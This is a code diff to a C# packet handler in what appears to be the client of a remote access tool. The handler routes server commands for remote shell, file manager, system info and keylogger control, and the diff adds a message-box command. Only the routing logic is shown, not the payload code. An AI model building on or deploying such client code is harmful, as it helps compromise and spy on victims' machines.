@@ -13,8 +13,9 @@ namespace Client.Networking
         private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
         private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
         private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
+        private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
 
-        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
+        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest,Action<MessageBoxRequest> onMessageBoxRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
         {
             _onSystemInfoRequest = onSystemInfoRequest;
             _onRemoteShellRequest = onRemoteShellRequest;
@@ -22,6 +23,7 @@ namespace Client.Networking
             _onKeyLoggerStart = onKeyLoggerStart;
             _onKeyLoggerStop = onKeyLoggerStop;
             _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
+            _onMessageBoxRequest = onMessageBoxRequest;
         }
 
         public void HandleLine(string json)
@@ -42,7 +44,7 @@ namespace Client.Networking
 
                     case PacketType.RemoteShellRequest:
                         var shellReq = JsonHelper.Deserialize<RemoteShellRequest>(json);
-                        if(shellReq != null)
+                        if (shellReq != null)
                         {
                             _onRemoteShellRequest(shellReq);
                         }
@@ -50,7 +52,7 @@ namespace Client.Networking
 
                     case PacketType.FileManagerRequest:
                         var fileReq = JsonHelper.Deserialize<FileManagerRequest>(json);
-                        if(fileReq != null)
+                        if (fileReq != null)
                         {
                             _onFileManagerRequest(fileReq);
                         }
@@ -79,7 +81,13 @@ namespace Client.Networking
                             _onKeyLoggerLangToggle(klLang);
                         }
                         break;
-
+                    case PacketType.MessageBoxRequest:
+                        var msgReq = JsonHelper.Deserialize<MessageBoxRequest>(json);
+                        if (msgReq != null)
+                        {
+                            _onMessageBoxRequest(msgReq);
+                        }
+                        break;
                     default:
                         break;
                 }
